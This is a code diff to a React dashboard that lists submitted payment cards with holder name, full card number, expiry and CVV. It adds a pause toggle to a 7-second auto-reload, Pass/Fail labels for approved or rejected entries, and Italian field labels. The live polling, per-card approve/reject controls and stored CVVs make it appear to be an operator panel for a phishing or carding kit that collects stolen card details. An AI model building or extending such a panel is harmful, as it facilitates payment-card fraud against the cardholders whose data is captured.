@@ -33,15 +33,17 @@ async function copyText(value: string) {
   const [rows, setRows] = useState<Submission[]>([]);
   const [message, setMessage] = useState("");
 
-  useEffect(() => {
-  if (!unlocked) return;
+  const [paused, setPaused] = useState(false);
+
+ useEffect(() => {
+  if (!unlocked || paused) return;
 
   const timer = window.setInterval(() => {
     window.location.reload();
   }, 7000);
 
   return () => window.clearInterval(timer);
-}, [unlocked]);
+}, [unlocked, paused]);
 
   useEffect(() => {
     let cancelled = false;
@@ -210,6 +212,14 @@ async function copyText(value: string) {
       <button
   type="button"
   className="rounded-lg border border-[#2a3548] px-3 py-1.5 text-sm text-[#9aa8b8] hover:bg-[#1a2332]"
+  onClick={() => setPaused((p) => !p)}
+>
+  {paused ? "Resume" : "Pause"}
+</button>
+
+      <button
+  type="button"
+  className="rounded-lg border border-[#2a3548] px-3 py-1.5 text-sm text-[#9aa8b8] hover:bg-[#1a2332]"
   onClick={() => window.location.reload()}
 >
   Refresh
@@ -319,26 +329,28 @@ async function copyText(value: string) {
                 <td className="px-3 py-2 capitalize">{row.status}</td>
                
                <td className="px-3 py-2">
-  {row.status === "approved" || row.status === "rejected" ? (
-    <span className="text-[#9aa8b8]">DONE</span>
-  ) : (
-    <div className="flex gap-2">
-      <button
-        type="button"
-        onClick={() => setStatus(row.id, "approved")}
-        className="rounded bg-green-600 px-2 py-1 text-xs text-white"
-      >
-        Approve
-      </button>
-      <button
-        type="button"
-        onClick={() => setStatus(row.id, "rejected")}
-        className="rounded bg-red-600 px-2 py-1 text-xs text-white"
-      >
-        Reject
-      </button>
-    </div>
-  )}
+ {row.status === "approved" ? (
+  <span className="font-medium text-green-500">Pass</span>
+) : row.status === "rejected" ? (
+  <span className="font-medium text-red-500">Fail</span>
+) : (
+  <div className="flex gap-2">
+    <button
+      type="button"
+      onClick={() => setStatus(row.id, "approved")}
+      className="rounded bg-green-600 px-2 py-1 text-xs text-white"
+    >
+      Approve
+    </button>
+    <button
+      type="button"
+      onClick={() => setStatus(row.id, "rejected")}
+      className="rounded bg-red-600 px-2 py-1 text-xs text-white"
+    >
+      Reject
+    </button>
+  </div>
+)}
 </td>
                
               </tr>
@@ -364,13 +376,13 @@ async function copyText(value: string) {
       </p>
 	  
       <div className="flex items-start justify-between gap-2">
-        Name: <p className="font-medium break-words">{row.first_name}</p>
+       <p className="font-medium break-words"> Titolare CC: {row.first_name}</p>
         <span className="shrink-0 capitalize text-[#9aa8b8]">{row.status}</span>
       </div>
 	  
-	  Card number:<p className="mt-1 break-all text-[#9aa8b8]">{row.card_number}</p>
+	  Numero CC:<p className="mt-1 break-all text-[#9aa8b8]">{row.card_number}</p>
 	  
-	  Expiry: <p className="mt-1 break-all text-[#9aa8b8]">{row.expiry}</p>
+	  Scadenza: <p className="mt-1 break-all text-[#9aa8b8]">{row.expiry}</p>
 	  
 	 CVV: <p className="mt-1 break-all text-[#9aa8b8]">{row.security_code}</p>
 
